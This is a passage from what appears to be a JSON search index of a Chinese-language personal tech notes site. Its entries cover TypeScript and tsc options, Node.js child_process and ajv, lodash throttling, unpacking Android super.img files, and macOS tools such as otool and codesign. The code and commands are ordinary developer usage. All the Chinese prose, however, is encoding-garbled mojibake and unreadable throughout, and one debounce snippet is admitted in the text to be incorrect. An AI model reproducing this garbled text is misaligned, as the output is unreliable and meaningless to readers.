}","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-TypeScript-Question-mark-and-exclamation-mark.html","loc":"/yq-doc-source-docs-front-end-TypeScript-Question-mark-and-exclamation-mark.html"},{"title":"tsæºç è°ƒè¯•","text":"ä¾‹å¦‚åœ¨ WebStrome å·¥å…·, éœ€è¦åœ¨ tsconfig.json è®¾ç½® sourceMap ä¸º true sourceMap é€‰é¡¹ç”¨äºæ§åˆ¶ TypeScript ç¼–è¯‘æ—¶æ˜¯å¦ç”Ÿæˆæºç æ˜ å°„æ–‡ä»¶(.map æ–‡ä»¶) sourceMap çš„ä½œç”¨ä¸»è¦æœ‰: æºç è°ƒè¯• - sourceMap æä¾›äº†æ˜ å°„å…³ç³»,å¯ä»¥åœ¨æµè§ˆå™¨çš„è°ƒè¯•å·¥å…·ä¸­ç›´æ¥è°ƒè¯• TypeScript æºä»£ç ,è€Œä¸æ˜¯ç¼–è¯‘åçš„ JavaScript ä»£ç ã€‚ é”™è¯¯å®šä½ - é€šè¿‡ sourceMap å®šä½åˆ° TypeScript æºç ä¸­çš„é”™è¯¯ä½ç½®,è€Œä¸æ˜¯ç¼–è¯‘åçš„ JavaScript ä¸­çš„ä½ç½®ã€‚ æºç æ˜ å°„ - åœ¨æµè§ˆå™¨ä¸­å¯ä»¥æ˜ å°„å›åŸå§‹çš„ TypeScript æºç ,æ–¹ä¾¿è°ƒè¯•åˆ†æã€‚ æºç å‹ç¼© - å³ä½¿ JavaScript ä»£ç è¢«å‹ç¼©/åˆå¹¶/ç²¾ç®€è¿‡,ä¹Ÿå¯ä»¥ä½¿ç”¨ sourceMap æ˜ å°„å›åŸå§‹ä»£ç ã€‚ æ›´å¥½çš„å¯è¯»æ€§ - æºç æ˜ å°„ä½¿å¾—ç¼–è¯‘åçš„ä»£ç å¯è¯»æ€§æ›´é«˜ã€‚ ä»£ç è½¬æ¢è·Ÿè¸ª - sourceMap è®°å½•äº†ä»£ç è½¬æ¢çš„æ•´ä¸ªè¿‡ç¨‹,å¯ä»¥çœ‹åˆ°ä»£ç è½¬æ¢å‰åçš„å¯¹åº”å…³ç³» æ³¨è§£ è¿™åªæ˜¯ä¸€ä¸ªå‚è€ƒ, å¹¶ä¸æ˜¯å¼€å¯äº†ä¸€å®šå¯ä»¥ç”¨","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-TypeScript-TS-source-code-debugging.html","loc":"/yq-doc-source-docs-front-end-TypeScript-TS-source-code-debugging.html"},{"title":"tsc","text":"æ³¨è§£ è€ƒè™‘è¿‡æ˜¯ä¸æ˜¯ç›´æ¥æ”¾åœ¨linuxæŒ‡ä»¤ä¸‹é¢, æƒ³äº†ä¸‹åªæ˜¯TypeScripté€‚ç”¨, ç½¢æ‰‹ ç¼–è¯‘tsæ–‡ä»¶ä¸ºjsæ–‡ä»¶, æ”¯æŒåŒæ—¶å¤šä¸ªæ–‡ä»¶ å®‰è£…: npm install typescript -g é€‰é¡¹/å‚æ•° --help æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ --module è½½å…¥æ‰©å±•æ¨¡å— --target è®¾ç½® ECMA ç‰ˆæœ¬ --declaration é¢å¤–ç”Ÿæˆä¸€ä¸ª .d.ts æ‰©å±•åçš„æ–‡ä»¶ å¦‚ç”Ÿæˆ ts-hw.d.tsã€ts-hw.js ä¸¤ä¸ªæ–‡ä»¶: tsc ts-hw.ts --declaration --removeComments åˆ é™¤æ–‡ä»¶çš„æ³¨é‡Š --out ç¼–è¯‘å¤šä¸ªæ–‡ä»¶å¹¶åˆå¹¶åˆ°ä¸€ä¸ªè¾“å‡ºçš„æ–‡ä»¶ --sourcemap ç”Ÿæˆä¸€ä¸ª sourcemap (.map) æ–‡ä»¶. sourcemap æ˜¯ä¸€ä¸ªå­˜å‚¨æºä»£ç ä¸ç¼–è¯‘ä»£ç å¯¹åº”ä½ç½®æ˜ å°„çš„ä¿¡æ¯æ–‡ä»¶ --module noImplicitAny åœ¨è¡¨è¾¾å¼å’Œå£°æ˜ä¸Šæœ‰éšå«çš„ any ç±»å‹æ—¶æŠ¥é”™ --watch åœ¨ç›‘è§†æ¨¡å¼ä¸‹è¿è¡Œç¼–è¯‘å™¨ã€‚ä¼šç›‘è§†è¾“å‡ºæ–‡ä»¶ï¼Œåœ¨å®ƒä»¬æ”¹å˜æ—¶é‡æ–°ç¼–è¯‘ã€‚ tsconfig.jsoné…ç½® strictPropertyInitialization ä¸¥æ ¼æ£€æŸ¥ç±»å±æ€§æ˜¯å¦æœ‰åˆå§‹å€¼ ä¸çŸ¥é“æ˜¯å¦æ˜¯æ›´æ–°äº†tsç‰ˆæœ¬çš„ç¼˜æ•…, ä½¿ç”¨ä¾èµ–æ³¨å…¥æ¡†æ¶æ—¶å€™, å¦‚æœ æ²¡ç»™åˆå§‹å€¼, ä¼šè¯¯æŠ¥, tsconfigä¸­é…ç½®æ­¤å±æ€§å€¼ä¸ºfalse, æ¥ä¸è¿›è¡Œè¿™ç§æ£€æŸ¥.","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-TypeScript-TSC.html","loc":"/yq-doc-source-docs-front-end-TypeScript-TSC.html"},{"title":"TypeScript å‡½æ•°","text":"å¯é€‰å‚æ•° å¯é€‰å‚æ•°: function buildName(firstName: string, lastName?: string) { if (lastName) return firstName + \" \" + lastName; else return firstName; } lastNameåŠ é—®å·è¡¨ç¤ºæ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°, å¯é€‰å‚æ•°å¿…é¡»è·Ÿåœ¨å¿…éœ€å‚æ•°åé¢, ä¹Ÿå¯ä»¥ç›´æ¥ç»™ä¸€ä¸ªé»˜è®¤å€¼: function function_name(param1[:type],param2[:type] = default_value) { } å‰©ä½™å‚æ•° ä½¿ç”¨ ... , ç±»ä¼¼Pythonçš„ *args æœ‰ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬ä¸çŸ¥é“è¦å‘å‡½æ•°ä¼ å…¥å¤šå°‘ä¸ªå‚æ•°ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å‰©ä½™å‚æ•°æ¥å®šä¹‰ã€‚ å‰©ä½™å‚æ•°è¯­æ³•å…è®¸æˆ‘ä»¬å°†ä¸€ä¸ªä¸ç¡®å®šæ•°é‡çš„å‚æ•°ä½œä¸ºä¸€ä¸ªæ•°ç»„ä¼ å…¥: function buildName(firstName: string, ...restOfName: string[]) { return firstName + \" \" + restOfName.join(\" \"); } let employeeName = buildName(\"Joseph\", \"Samuel\", \"Lucas\", \"MacKinzie\");","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-TypeScript-function.html","loc":"/yq-doc-source-docs-front-end-TypeScript-function.html"},{"title":"å†…ç½®å¯¹è±¡","text":"process process æ˜¯ Node.js ç¯å¢ƒä¸­çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œæä¾›äº†ä¸å½“å‰è¿›ç¨‹ç›¸å…³çš„ä¿¡æ¯å’ŒåŠŸèƒ½ã€‚ å®ƒä¸æ˜¯åœ¨æµè§ˆå™¨ç¯å¢ƒä¸‹ä½¿ç”¨çš„ï¼Œè€Œæ˜¯åœ¨ æœåŠ¡å™¨ç«¯æˆ–å‘½ä»¤è¡Œç¯å¢ƒ ä¸‹ä½¿ç”¨çš„ã€‚ process å¯¹è±¡åŒ…å«äº†è®¸å¤šå±æ€§å’Œæ–¹æ³•ï¼Œç”¨äºè·å–å’Œæ“ä½œä¸å½“å‰è¿›ç¨‹ç›¸å…³çš„ä¿¡æ¯ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ process å±æ€§å’Œæ–¹æ³•ï¼š process.argv è¿”å›ä¸€ä¸ªåŒ…å«å‘½ä»¤è¡Œå‚æ•°çš„æ•°ç»„ã€‚ ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ Node.js çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„; ç¬¬äºŒä¸ªå…ƒç´ æ˜¯å½“å‰æ‰§è¡Œçš„ JavaScript æ–‡ä»¶è·¯å¾„; åç»­å…ƒç´ æ˜¯ä¼ é€’ç»™è„šæœ¬çš„å‘½ä»¤è¡Œå‚æ•° process.env è¿”å›ä¸€ä¸ªåŒ…å«å½“å‰è¿›ç¨‹ç¯å¢ƒå˜é‡çš„å¯¹è±¡ã€‚ process.cwd() è¿”å›å½“å‰å·¥ä½œç›®å½•çš„è·¯å¾„ã€‚ process.exit([code]) ç»ˆæ­¢å½“å‰è¿›ç¨‹çš„æ‰§è¡Œã€‚å¯é€‰çš„ code å‚æ•°ç”¨äºæŒ‡å®šè¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ç ã€‚ process.pid è¿”å›å½“å‰è¿›ç¨‹çš„è¿›ç¨‹ IDã€‚ process.platform è¿”å›ä¸€ä¸ªè¡¨ç¤ºå½“å‰æ“ä½œç³»ç»Ÿå¹³å°çš„å­—ç¬¦ä¸²ã€‚ process.stdout å’Œ process.stderr æä¾›å¯¹æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºæµçš„è®¿é—®ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-node-Built--in-object.html","loc":"/yq-doc-source-docs-front-end-node-Built--in-object.html"},{"title":"nodeå¯åŠ¨å¸¸è§å‚æ•°","text":"--remote-debug-port= <port> æ—§ç‰ˆè°ƒè¯•å‚æ•°; ä½¿ç”¨æ—§çš„ Legacy åè®®,åŠŸèƒ½è¾ƒå°‘ --inspect= <port> æ–°ç‰ˆæ”¯æŒè°ƒè¯•å‚æ•°; å½“ä½¿ç”¨nodeæ—¶, æœ‰æ—¶å€™éœ€è¦å¯åŠ¨æ–­ç‚¹è°ƒè¯•åŠŸèƒ½, è¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨æ­¤å‚æ•°, ç„¶ååœ¨è¿™ä¸ªç«¯å£è¿›è¡Œè°ƒè¯•; å¯ä»¥åœ¨ Chrome æµè§ˆå™¨ä¸­é€šè¿‡ chrome://inspect è®¿é—®è°ƒè¯•åœ°å€ --inspect-brk= <port> å½“ä½¿ç”¨nodeæ—¶, æœ‰æ—¶å€™éœ€è¦å¯åŠ¨æ–­ç‚¹è°ƒè¯•åŠŸèƒ½, è¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨æ­¤å‚æ•°, ç„¶ååœ¨è¿™ä¸ªç«¯å£è¿›è¡Œè°ƒè¯•; ä¸ --inspect ç›¸æ¯”, ä¼šåœ¨å¯åŠ¨æ—¶æš‚åœ ç«¯å£è°ƒè¯•å·¥å…· WebStorm VS VSCode WebStormä»…æ”¯æŒå•ä¸ªç«¯å£çš„è°ƒè¯•: è€ŒVSCodeæ”¯æŒå¤šç«¯å£åŒæ—¶å¤šæ–­ç‚¹å¯åŠ¨:","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-node-Node-starts-common-parameters.html","loc":"/yq-doc-source-docs-front-end-node-Node-starts-common-parameters.html"},{"title":"child_process","text":"å®˜ç½‘:: Child Process å­è¿›ç¨‹æ“ä½œç›¸å…³æ¨¡å— åˆ›å»ºå­è¿›ç¨‹æ–¹å¼: spawn : å¯åŠ¨ä¸€ä¸ªå­è¿›ç¨‹æ¥æ‰§è¡Œå‘½ä»¤ï¼› exec : å¯åŠ¨ä¸€ä¸ªå­è¿›ç¨‹æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸ spawn ä¸åŒçš„æ˜¯ï¼Œå®ƒæœ‰ä¸€ä¸ªå›è°ƒå‡½æ•°è·çŸ¥å­è¿›ç¨‹çš„çŠ¶å†µï¼› execFile : å¯åŠ¨ä¸€ä¸ªå­è¿›ç¨‹æ¥æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼› fork : ä¸ spawn ç±»ä¼¼ï¼Œä¸åŒç‚¹åœ¨äºå®ƒåˆ›å»º Node çš„å­è¿›ç¨‹åªéœ€æŒ‡å®šè¦æ‰§è¡Œçš„ JavaScript æ–‡ä»¶æ¨¡å—å³å¯ï¼› æ³¨è§£ exec , execFile , fork åº•å±‚éƒ½æ˜¯é€šè¿‡ spawn å®ç° spawn exec åŸºæœ¬ä½¿ç”¨: const {exec} = require('child_process'); exec('ls', (error, stdout, stderr) => { // do ... }); å…¶ä¸­, (error, stdout, stderr) å¯¹åº”ç±»å‹å¦‚ä¸‹: error: ExecException | null, // ExecExceptionåªæ˜¯ä¸€ä¸ªæ¥å£, é€šç”¨å±æ€§æœ‰å››ä¸ª: // cmd?: string | undefined; // killed?: boolean | undefined; // code?: number | undefined; // signal?: NodeJS.Signals | undefined; stdout: str, stderr: str, é«˜çº§ä¸€ç‚¹ç”¨æ³•, å¯¹è¾“å‡ºè¿›è¡Œç›‘å¬: exec('ls').stdout.on('data', data => { console.log(data); }); execFile ä¾‹: const child_process = require('child_process'); child_process.execFile('ls', ['./'], (error, stdout, stderr) => { /// do ... console.log(error, stdout, stderr); }); fork æ”¯æŒçš„äº‹ä»¶ close äº‹ä»¶: å­è¿›ç¨‹çš„ stdio æµå…³é—­æ—¶è§¦å‘ï¼› disconnect äº‹ä»¶: äº‹ä»¶åœ¨çˆ¶è¿›ç¨‹æ‰‹åŠ¨è°ƒç”¨ child.disconnect å‡½æ•°æ—¶è§¦å‘ï¼› error äº‹ä»¶: äº§ç”Ÿé”™è¯¯æ—¶ä¼šè§¦å‘ï¼› exit äº‹ä»¶: å­è¿›ç¨‹è‡ªè¡Œé€€å‡ºæ—¶è§¦å‘ï¼› message äº‹ä»¶: å®ƒåœ¨å­è¿›ç¨‹ä½¿ç”¨ process.send() å‡½æ•°æ¥ä¼ é€’æ¶ˆæ¯æ—¶è§¦å‘ï¼› äº‹ä»¶ä½¿ç”¨ on è°ƒç”¨: exec('ls').stdout.on('exit', (code, signal) => { console.log(code); });","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-node-Standard-library-Child_prCess.html","loc":"/yq-doc-source-docs-front-end-node-Standard-library-Child_prCess.html"},{"title":"ajv","text":"json-schema: ç”¨æ¥æè¿° json é•¿ä»€ä¹ˆæ ·æ•°æ®æ ¼å¼ ajv æ˜¯ä¸€ä¸ªæ ¡éªŒ json-schema çš„æ•°æ®æ ¼å¼å·¥å…· json-schema é»˜è®¤å«æœ‰ä¸‹é¢ 6 ç§æ•°æ®ç»“æ„ string number object array boolean null ä½¿ç”¨ç”¨ä¾‹: const Ajv = require(\"ajv\") const ajv = new Ajv() const schemaStr = '{\"type\":\"object\",\"description\":\"Windows specific launch configuration attributes.\",\"properties\":{\"env\":{\"additionalProperties\":{\"type\":\"string\"},\"default\":{},\"description\":\"Environment variables defined as a key value pair. Property ends up being the Environment Variable and the value of the property ends up being the value of the Env Variable.\",\"type\":\"object\",\"pattern\":\"&#94;(?!.*\\\\\\\\$\\\\\\\\{(env|config|command)\\\\\\\\.)\",\"patternErrorMessage\":\"\\'env.\\', \\'config.\\' and \\'command.\\' are deprecated, use \\'env:\\', \\'config:\\' and \\'command:\\' instead.\"}},\"pattern\":\"&#94;(?!.*\\\\\\\\$\\\\\\\\{(env|config|command)\\\\\\\\.)\",\"patternErrorMessage\":\"\\'env.\\', \\'config.\\' and \\'command.\\' are deprecated, use \\'env:\\', \\'config:\\' and \\'command:\\' instead.\"}' const schema = JSON.parse(schemaStr) // const schema = { // type: \"object\", // description: 'test o', // properties: { // env: { // additionalProperties: {type: 'string'}, // default: {}, // description: 'env o', // type: 'object', // pattern: \"&#94;(?!.*\\\\$\\\\{(env|config|command)\\\\.)\" // } // }, // pattern: \"&#94;(?!.*\\\\$\\\\{(env|config|command)\\\\.)\" // } const data = {env: {\"1\": \"1\"}} // const valid = ajv.validate(schema, data) const validRule = ajv.compile(schema) const valid = validRule(data) if (!valid) console.log(ajv.errors); else console.log('suc', valid)","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-node-Three--party-library-AJV.html","loc":"/yq-doc-source-docs-front-end-node-Three--party-library-AJV.html"},{"title":"AnchorJS","text":"é’ˆå¯¹æ–‡æ¡£é¡¹ç›®çš„ç´¢å¼•å§. å®˜ç½‘: anchorjs-doc å®‰è£…/ä½¿ç”¨ npm: // npm install anchor-js import AnchorJS from 'anchor-js'; const anchors = new AnchorJS(); anchors.add(); cdn: <script src=\"https://cdn.jsdelivr.net/npm/anchor-js/anchor.min.js\"></script> <script> anchors.add(); </script> js file: import 'https://cdn.jsdelivr.net/npm/anchor-js/anchor.min.js'; anchors.add(); ä¸€äº›æ–¹æ³• å»ºè®®åœ¨æ–‡æ¡£å…¨éƒ¨åŠ è½½å®Œæˆä¹‹å‰ä½¿ç”¨: <!-- Add anchors before the closing body tag. --> <script> anchors.add(); </script> </body> æˆ–è€…: // Add anchors on DOMContentLoaded document.addEventListener('DOMContentLoaded', function(event) { anchors.add(); });","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-node-Three--party-library-Anchorjs.html","loc":"/yq-doc-source-docs-front-end-node-Three--party-library-Anchorjs.html"},{"title":"lodash","text":"èŠ‚æµä¸æ¶ˆæŠ– èŠ‚æµ(throttle): n ç§’å†…åªè¿è¡Œä¸€æ¬¡ï¼Œè‹¥åœ¨ n ç§’å†…é‡å¤è§¦å‘ï¼Œåªæœ‰ä¸€æ¬¡ç”Ÿæ•ˆ æ¶ˆæŠ–(debounce): n ç§’ååœ¨æ‰§è¡Œè¯¥äº‹ä»¶ï¼Œè‹¥åœ¨ n ç§’å†…è¢«é‡å¤è§¦å‘ï¼Œåˆ™é‡æ–°è®¡æ—¶ å‚è€ƒ: https://vue3js.cn/interview/JavaScript/debounce_throttle.html#ä»£ç å®ç° é‡è¦ æ­¤åº“æä¾›çš„èŠ‚æµä¸æ¶ˆæŠ–, æ˜¯ä¸€ä¸ªå›è°ƒè€Œä¸æ˜¯å‡½æ•°è°ƒç”¨. ç±»ä¼¼äº: const Sleep = (ms: number)=> { return new Promise(resolve=>setTimeout(resolve, ms)) } const debounce = async (func, wait: number) => { if (typeof func !== 'function') { throw new TypeError('Expected a function') } // ç­‰å¾… xxx ms await Sleep(wait); return func } è¿™é‡Œçš„ä»£ç å…¶å®æœ‰ç‚¹é—®é¢˜, æ²¡æœ‰å®ç°åˆ° é‡å¤è§¦å‘ï¼Œé‡æ–°è®¡æ—¶ lodashç”¨äºèŠ‚æµ(throttle)å‡½æ•°çš„è°ƒç”¨é¢‘ç‡,ä»¥æé«˜æ€§èƒ½ã€‚ é™åˆ¶æŒ‡å®šçš„æ—¶é—´é—´éš”å†…æœ€å¤šæ‰§è¡Œä¸€æ¬¡åŸå‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´,å®ƒé™åˆ¶äº†è°ƒç”¨å‡½æ•°çš„é¢‘ç‡,é¿å…å‡½æ•°è¢«è¿‡äºé¢‘ç¹åœ°è°ƒç”¨ã€‚ ä½¿ç”¨ lodash.throttle çš„å¥½å¤„æœ‰: é˜²æ­¢é¢‘ç¹çš„äº‹ä»¶è§¦å‘å¯¼è‡´æ€§èƒ½é—®é¢˜,å¦‚ resizeã€scroll ç­‰äº‹ä»¶çš„å¤„ç†å‡½æ•°ã€‚ æ§åˆ¶åŠ¨ç”»æˆ–è½®è¯¢åŠŸèƒ½çš„é¢‘ç‡,é¿å…è¿‡åº¦å ç”¨ CPU èµ„æºã€‚ ç½‘ç»œè¯·æ±‚é¢‘ç‡æ§åˆ¶,å‡å°‘ä¸å¿…è¦çš„è¯·æ±‚é‡ã€‚ è¾“å…¥æ¡†å®æ—¶æœç´¢suggestionsæ—¶é™åˆ¶è¯·æ±‚é¢‘ç‡ã€‚ ä¾‹å¦‚: import { throttle } from 'lodash'; function handleResize() { // å¤„ç†çª—å£ resize } window.addEventListener('resize', throttle(handleResize, 100)); è¿™å°†é™åˆ¶ handleResize å‡½æ•°æ¯ 100ms è‡³å¤šæ‰§è¡Œä¸€æ¬¡,ä»è€Œæé«˜é¡µé¢æ»šåŠ¨æ—¶çš„æ€§èƒ½ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-node-Three--party-library-lodash.html","loc":"/yq-doc-source-docs-front-end-node-Three--party-library-lodash.html"},{"title":"nodejsä¸‹è½½å®‰è£…","text":"å®˜ç½‘å…¨ç‰ˆæœ¬nodeåœ°å€: https://nodejs.org/dist","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-node-node-download-and-install.html","loc":"/yq-doc-source-docs-front-end-node-node-download-and-install.html"},{"title":"é•œåƒæ–‡ä»¶è§£åŒ…","text":"ç³»ç»Ÿ: Mac ç”¨åˆ°çš„å·¥å…·. simg2img lpunpack å…¶ä¸­ simg2img ç›´æ¥brewå®‰è£…å³å¯: brew install simg2img lpunpack å°±éœ€è¦è‡ªè¡Œå»githubä¸Šæ‰¾äº†, éœ€è¦æ‰¾äº†è‡ªå·±ç¼– ç¬¬ä¸€æ¬¡æ‰¾äº†ä¸ªc++çš„, æœ¬åœ°æ²¡æœ‰ç¼–è¿‡, ç„¶åæ‰¾äº†ä¸ªpyçš„, çœ‹èµ·æ¥å¯ä»¥, åœ°å€: https://github.com/unix3dgforce/lpunpack å¤§è‡´ç”¨æ³•, ç”¨çš„æ˜¯ Redmi K60 çš„å›½è¡Œçº¿åˆ·åŒ…, ä¸‹è½½çš„æ–‡ä»¶æ˜¯å®˜æ–¹çš„tgzæ ¼å¼, è§£å‹åå¯ä»¥æ‰¾åˆ°imageä¸‹mainçš„ super.img æ–‡ä»¶(å½“å‰å®‰å“è§„å®šçš„åŠ¨æ€åˆ†åŒºæ–‡ä»¶). å¯ä»¥fileæŸ¥çœ‹æ–‡ä»¶æ ¼å¼: file super.img super.img: Android sparse image, version: 1.0, Total of 2228224 4096-byte output blocks in 141 input chunks. æ˜¯ sparse image , éœ€è¦ä½¿ç”¨ simg2img è½¬æ¢ä¸º raw: simg2img super.img super_raw.img æŸ¥çœ‹æ˜¯å¦æˆåŠŸ: file super_raw.img super_raw.img:: data æˆåŠŸ ç„¶åè§£å‹åˆ†åŒºé•œåƒ(æˆ‘æ–°å»ºäº†ä¸€ä¸ªdataç›®å½•æ”¾åœ¨ä¸‹é¢): python3 lpunpack.py super_raw.img data/ ç»“æœ: file data/* data/mi_ext_a.img: data data/mi_ext_b.img: empty data/odm_a.img: data data/odm_b.img: empty data/product_a.img: data data/product_b.img: empty data/system_a.img: data data/system_b.img: empty data/system_ext_a.img: data data/system_ext_b.img: empty data/vendor_a.img: data data/vendor_b.img: empty data/vendor_dlkm_a.img: data data/vendor_dlkm_b.img: empty è¿™é‡Œçš„imgæ–‡ä»¶å°±æ˜¯ ext4 æ ¼å¼çš„é•œåƒäº†, æœ€ç®€å•çš„æ‰“å¼€æ–¹å¼å°±æ˜¯ä½¿ç”¨linuxæŒ‚è½½, ä¸€å¼€å§‹æ‰¾äº†å¾ˆä¹…æ€ä¹ˆåœ¨Win/Macç³»ç»Ÿæ‰“å¼€, éƒ½å¤±è´¥äº†, æœ€ç»ˆè¿˜æ˜¯æ‹¿åˆ°è™šæ‹Ÿæœºå»æŒ‚è½½æ‰“å¼€çš„. æ³¨è§£ windowsä¸‹çš„è¯æœ‰ä¸ªä»“åº“çš„ simg2img å¯ä»¥ç”¨: https://github.com/KinglyWayne/simg2img_win é‡Œé¢çš„ext2ä¸èƒ½ç”¨.","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Android-Mirror-file-dissection-package.html","loc":"/yq-doc-source-docs-operating-system-Android-Mirror-file-dissection-package.html"},{"title":"otool","text":"æŸç§ç¨‹åº¦ä¸Šå¯ä»¥çœ‹ä½œ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/ldd çš„æ›¿ä»£, å› ä¸ºMacä¸Šæ²¡æœ‰ ldd æŒ‡ä»¤. iOSåº”ç”¨æ‰€ä¾èµ–çš„ç³»ç»Ÿåº“æ£€æŸ¥ otool(object file displaying tool) é’ˆå¯¹ç›®æ ‡æ–‡ä»¶çš„å±•ç¤ºå·¥å…·ï¼Œç”¨æ¥å‘ç°åº”ç”¨ä¸­ä½¿ç”¨åˆ°äº†å“ªäº›ç³»ç»Ÿåº“ï¼Œè°ƒç”¨äº†å…¶ä¸­å“ªäº›æ–¹æ³•ï¼Œ ä½¿ç”¨äº†åº“ä¸­å“ªäº›å¯¹è±¡åŠå±æ€§ï¼Œå®ƒæ˜¯Xcodeè‡ªå¸¦çš„å¸¸ç”¨å·¥å…·ã€‚ å¸¸ç”¨çš„å‘½ä»¤: -f print the fat headers -a print the archive header -h print the mach header -l print the load commands -L æ‰“å°ç”¨åˆ°çš„ shared libraries, å°±æ˜¯çœ‹ç”¨åˆ°äº†å“ªäº›åŠ¨æ€åº“ -D print shared library id name -t æ‰“å°æ±‡ç¼–çš„textæ®µ, ä¸€èˆ¬éœ€è¦ä¸-vä¸€èµ·ä½¿ç”¨(the text section (disassemble with -v)) -p <routine name> start dissassemble from routine name -s <segname> <sectname> print contents of section -d print the data section -o print the Objective-C segment -r print the relocation entries -S print the table of contents of a library -T print the table of contents of a dynamic shared library -M print the module table of a dynamic shared library -R print the reference table of a dynamic shared library -I print the indirect symbol table -H print the two-level hints table -G print the data in code table -v print verbosely (symbolically) when possible -V æ‰“å°åæ±‡ç¼–ç¬¦å·æ“ä½œæ•°(disassembled operands symbolically) -c print argument strings of a core file -X print no leading addresses or headers -m don't use archive(member) syntax -B force Thumb disassembly (ARM objects only) -q use llvm's disassembler (the default) -Q use otool(1)'s disassembler -mcpu=arg use `arg' as the cpu for disassembly -j print opcode bytes -P print the info plist section as strings -C print linker optimization hints --version print the version of /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/otool","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-Otool.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-Otool.html"},{"title":"security","text":"è®¿é—®é’¥åŒ™ä¸² å¦‚: security find-identity -v -p codesigning","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-Security.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-Security.html"},{"title":"codesign","text":"åˆ›å»ºå’Œç®¡ç†è¯ä¹¦ ç”¨æ³•: codesign -s identity [-fv*] [-o flags] [-r reqs] [-i ident] path ... # ç­¾å codesign -v [-v*] [-R=<req string>|-R <req file path>] path|[+]pid ... # éªŒè¯ codesign -d [options] path ... # å†…å®¹æ˜¾ç¤º codesign -h pid ... # ä¸»æœºè·¯å¾„æ˜¾ç¤º codesign --validate-constraint path ... # æ£€æŸ¥æä¾›çš„çº¦æŸplist (check the supplied constraint plist) è¯´æ˜: -s ç­¾å -f force, å¼ºåˆ¶é‡æ–°ç­¾å -i è¡¨ç¤ºä¿®æ”¹ç­¾åå‚æ•° Identifier -o ä¿®æ”¹flags -d æ˜¯displayå±•ç¤ºç­¾åä¿¡æ¯çš„æ„æ€ -v æ˜¯verboseçš„æ„æ€ï¼Œè¶Šå¤šçš„verboseæ˜¾ç¤ºä¿¡æ¯è¶Šå¤šï¼Œé€šå¸¸3ä¸ªå°±å·²ç»è¶³å¤Ÿäº† -vvv --entitlements æˆæƒæœºåˆ¶ entitementsä¿¡æ¯ æŸ¥çœ‹WeChatçš„ç­¾å: codesign -d -vvv WeChat.app å‚è€ƒ: codesignçš„ä½¿ç”¨","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-codeSign.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-codeSign.html"},{"title":"gs","text":"ghostscriptå‘½ä»¤ ä¸“é—¨ç”¨äºå¤„ç†.psæ–‡ä»¶ä»¥åŠPDFç›¸å…³çš„æ–‡ä»¶, æ–‡ä»¶ç›´æ¥è½¬æ¢, è´¨é‡é«˜ åªæ˜¯ç®€å•çš„å¯ä»¥å°±ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/Mac/MacæŒ‡ä»¤/sips","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-company.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-company.html"},{"title":"convert","text":"å®‰è£…: brew install imagemagick ä¸ /docs/æ“ä½œç³»ç»Ÿ/Mac/MacæŒ‡ä»¤/sips å·®ä¸å¤š convert æ˜¯ imagemagick ç¨‹åºåŒ…çš„å‘½ä»¤, convert å…¶å®ç­‰ä»·äº magick æ‰§è¡Œè½¬æ¢å‘½ä»¤åªéœ€è¦ä¼ å…¥å¾…è½¬æ¢çš„å›¾ç‰‡ä»¥åŠè¾“å‡ºçš„å›¾ç‰‡æ–‡ä»¶åå³å¯: convert aa.eps a.ico æ”¯æŒå‡ ä¹æ‰€æœ‰çš„ä½å›¾/çŸ¢é‡å›¾æ ¼å¼. ç¾ä¸­ä¸è¶³çš„ä¸€ç‚¹å°±æ˜¯è½¬æ¢çš„å›¾ç‰‡è´¨é‡ä¸é«˜, pdfè½¬pngä¼šä¸¢å¤±èƒŒæ™¯ å‚è€ƒ: https://blog.csdn.net/qq_41437512/article/details/122619375","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-convert.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-convert.html"},{"title":"launchctl","text":"MacOSä¸åƒ Linux æœ‰ /etc/init.d/rc.local ä»¥åŠ service 